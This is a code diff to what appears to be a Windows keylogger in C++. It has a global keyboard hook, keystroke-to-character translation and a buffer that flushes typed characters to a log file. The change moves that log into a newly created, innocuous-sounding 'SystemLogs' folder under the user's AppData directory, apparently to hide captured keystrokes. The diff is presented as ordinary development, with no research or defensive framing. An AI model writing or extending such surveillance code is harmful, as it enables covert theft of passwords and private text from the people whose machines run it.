@@ -3,6 +3,9 @@
 #include "config.h"
 #include <cstdio>
 #include <time.h>
+#include <shlobj.h>
+#include <tchar.h>
+#include <string>
 
 HHOOK hHook = NULL;
 time_t lastKeypressTime = 0;
@@ -34,13 +37,25 @@ char getTypedChar(DWORD vkCode, DWORD scanCode) {
     return '\0';
 }
 
+std::string getLogFilePathStr()
+{
+    char appdataPath[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
+
+    std::string fullPath = std::string(appdataPath) + LOG_FILE_PATH;
+
+    CreateDirectoryA((std::string(appdataPath) + "\\SystemLogs").c_str(), NULL);
+
+    return fullPath;
+}
+
 void flushBuffer()
 {
     if (index == 0)
         return;
 
     // append mode
-    FILE *file = fopen(LOG_FILE_PATH, "a+");
+    FILE *file = fopen(getLogFilePathStr().c_str(), "a+");
     if (file)
     {
 
